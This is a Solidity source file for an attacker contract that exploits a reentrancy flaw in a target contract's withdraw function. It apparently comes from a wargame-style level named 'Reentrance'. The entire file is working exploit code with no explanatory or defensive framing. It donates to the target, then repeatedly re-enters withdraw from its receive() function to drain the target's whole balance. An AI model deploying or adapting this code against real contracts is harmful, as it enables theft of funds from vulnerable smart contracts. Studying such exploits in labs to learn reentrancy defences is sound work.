pragma solidity ^0.6.12;

contract FinalFixedAttacker {
    address public reentrance_instance;

    mapping(uint256 => bool) reentrancyGuard;

    constructor(address _reentrance) public {
        reentrance_instance = _reentrance;
    }

    function attack() public {
        // Send 1e15 (0.001 ETH) to donate to increase instance balance
        (bool donationSuccess,) = reentrance_instance.call{value: 1000000000000000}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        require(donationSuccess, "Donation failed");

        // Initiate the reentrancy attack with small amount to avoid underflow
        uint256 initialAmount = 10000000000000; // 0.00001 ETH (1e13)
        (bool firstWithdraw,) = reentrance_instance.call(
            abi.encodeWithSignature("withdraw(uint256)", initialAmount)
        );
        require(firstWithdraw, "First withdrawal failed");
    }

    receive() external payable {
        // Reentrancy loop to drain all funds with smaller amounts
        uint256 smallAmount = 10000000000000; // 0.00001 ETH
        bool success;
        while (address(reentrance_instance).balance >= smallAmount) {
            (success,) = reentrance_instance.call(
                abi.encodeWithSignature("withdraw(uint256)", smallAmount)
            );
            if (!success) break;
        }
        require(success, "Final reentrancy failed");
    }
}
